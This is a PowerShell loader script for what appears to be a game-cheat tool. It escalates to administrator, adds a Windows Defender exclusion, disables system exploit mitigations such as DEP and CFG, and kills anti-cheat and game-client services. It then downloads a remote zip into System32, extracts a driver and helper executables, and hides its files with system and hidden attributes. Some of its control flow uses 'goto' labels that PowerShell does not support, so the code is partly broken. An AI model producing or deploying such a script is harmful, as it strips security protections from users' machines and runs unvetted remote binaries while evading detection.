
# Function to check if the script is running with administrative privileges
function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $adminRole = [Security.Principal.WindowsBuiltInRole]::Administrator

    return $currentUser.IsInRole($adminRole)
}

# Check if running with administrative privileges
if (-not (Test-Admin)) {
    # If not, relaunch the script with administrative privileges
    Start-Process powershell -Verb RunAs -ArgumentList ("-File", $MyInvocation.MyCommand.Path)
    Exit
}

# Define variables
$link = "https://gist.github.com/Bytrl/894a468f05f7fe7cd2616bdfe6684a3f"
$pl1 = "https://github.com/Bytrl/zips/raw/664eea8ace048e7e9f3a18c3549a83dc23fd3771/bin.zip"
$bin = "$env:TEMP\Bytrl"
$binZip = "$env:SystemDrive\Windows\System32\bin.zip"
$authbat = Join-Path $bin "launch-auth.bat"
$maskbat = Join-Path $bin "launch-masked.bat"
$normal = Join-Path $bin "SecurityHealthSystray-x86_64-SSE4-AVX2.exe"

# Check if ldr_1.4.exe is already running
if (Get-Process -name "ldr_1.4" -ErrorAction SilentlyContinue) {
    goto auth
} else {
    goto fail
}

:auth
$hwid = (Get-CimInstance Win32_ComputerSystemProduct).UUID
$authFound = $false

# Use PowerShell to fetch content from the link and search for the hwid
Invoke-WebRequest -Uri $link | ForEach-Object {
    if ($_ -match $hwid) {
        $authFound = $true
        break
    }
}

if ($authFound) {
    goto pass
} else {
    goto fail
}

# Pass section
:pass
# Remaining PowerShell code for 'pass' section
$processList = Get-Process -Name "ldr_1.4" -ErrorAction SilentlyContinue
if ($processList) {
    goto auth
} else {
    attrib +s +h "$env:TMP\wtmpd"
    attrib +s +h "$env:TMP\cetrainers"
    attrib +s +h "$env:TMP\afolder"
    attrib +s +h "$env:TMP\bfcwrk"
    Stop-Process -Name "control" -Force
    cls
    Stop-Process -Name "SecurityHealthSystray-x86_64-SSE4-AVX2" -Force
    cls
    Stop-Service -Name "+" -Force
    cls

    $ceProcess = Get-Process -Name "cheatengine-x86_64" -ErrorAction SilentlyContinue
    if ($ceProcess) {
        Stop-Process -Name "cheatengine-x86_64" -Force
        cls
        Stop-Process -Name "cheatengine-x86_64-SSE4-AVX2" -Force
        cls
        Stop-Service -Name "CEDRIVER73" -Force
        cls
    }

    Add-MpPreference -ExclusionPath "$env:TMP\Bytrl"
    cls
    Set-ProcessMitigation -System -Disable CFG, StrictCFG, SuppressExports
    cls
    Set-ProcessMitigation -System -Disable DEP, EmulateAtlThunks
    cls
    Set-ProcessMitigation -System -Disable ForceRelocateImages
    cls
    Set-ProcessMitigation -System -Disable BottomUp, HighEntropy
    cls
    Stop-Process -Name "Steam" -Force
    cls
    Stop-Process -Name "EasyAntiCheat" -Force
    cls
    Stop-Process -Name "EADesktop" -Force
    cls
    Stop-Service -Name "EasyAntiCheat" -Force
    cls
    Stop-Service -Name "Steam Client Service" -Force
    cls
    Stop-Service -Name "EABackgroundService" -Force
    cls
    Remove-Item -Path $bin -Recurse -Force
    cls
    Invoke-WebRequest -Uri $pl1 -OutFile $binZip
    cls
    Expand-Archive -Path $binZip -DestinationPath $bin
    Move-Item "$bin\$auth" "$env:SystemDrive\"
    cls
}

# Launch section
:launch
# Remaining PowerShell code for 'launch' section
$hiddenAttributes = @('+S', '+H')
Get-Item -Path "$env:TMP\wtmpd", "$env:TMP\cetrainers", "$env:TMP\afolder", "$env:TMP\bfcwrk", $bin, $normal, $authbat, $maskbat |
    ForEach-Object { attrib $_ $hiddenAttributes }
Get-Item -Path "$bin\autorun", "$bin\clibs64", "$bin\win64", "$bin\allochook-x86_64.dll", "$bin\Bytrl.sys", "$bin\defines.lua", "$bin\libipt-64.dll", "$bin\lua53-64.dll", "$bin\luaclient-x86_64.dll", "$bin\main.lua", "$bin\control.exe", "$bin\PsExec.exe", "$bin\speedhack-x86_64.dll", "$bin\unload.exe", "$bin\unload+.bat", "$bin\vehdebug-x86_64.dll", "$bin\vmdisk.img", "$bin\winhook-x86_64.dll", "$bin\gerye465ye4h4y.exe", "$bin\clone.exe", "$bin\mask.exe", "$bin\hide.exe" |
    ForEach-Object { attrib $_ $hiddenAttributes }
cls
Write-Host "1. Normal"
Write-Host "2. Masked"
Write-Host "3. NtAuth"
Write-Host ""
$choice = Read-Host "Select Launch Variant (1-3)"
if ($choice -eq "1") {
    Start-Process $normal
} elseif ($choice -eq "2") {
    Start-Process $maskbat
} elseif ($choice -eq "3") {
    Start-Process $authbat
} else {
    Write-Host "Invalid choice. Please enter a number between 1 and 3."
    Start-Sleep -Seconds 2
    Remove-Item -Path "$env:TMP\wtmpd" -Recurse -Force
    goto launch
}

# Fail section
:fail
# Remaining PowerShell code for 'fail' section
$hiddenAttributes = @('+S', '+H')
Get-Item -Path "$env:TMP\wtmpd", "$env:TMP\cetrainers", "$env:TMP\afolder", "$env:TMP\bfcwrk" |
    ForEach-Object { attrib $_ $hiddenAttributes }
Remove-Item -Path "$env:TMP\wtmpd" -Recurse -Force
Remove-Item -Path "$env:TMP\Bytrl" -Recurse -Force
Remove-Item -Path $bin -Recurse -Force
cls
Write-Host ""
Write-Host "*Send Me This Key For Authorization!*"
Write-Host ""
Write-Host $hwid
Write-Host ""
Write-Host "Discord: Bytrl"
cls
Write-Host "____________________________________________________"
Start-Sleep -Seconds 2
Exit

# Cleanup section
:cleanup
# Remaining PowerShell code for 'cleanup' section
Remove-Item -Path "$env:TMP\bin" -Recurse -Force
Remove-Item -Path "$env:TMP\cetrainers" -Recurse -Force
Remove-Item -Path "$env:TMP\afolder" -Recurse -Force
Remove-Item -Path "$env:TMP\wtmpd" -Recurse -Force
Remove-Item -Path $binZip -Force
cls
# Exit section
Exit


# UACPrompt section
$uacScript = @"
Set UAC = CreateObject("Shell.Application")
UAC.ShellExecute "powershell.exe", "-File $MyInvocation.MyCommand.Path", "", "runas", 1
"@
$uacScript | Out-File "$env:TEMP\getadmin.vbs" -Force
Start-Process "$env:TEMP\getadmin.vbs"
Remove-Item "$env:TEMP\getadmin.vbs" -Force
Exit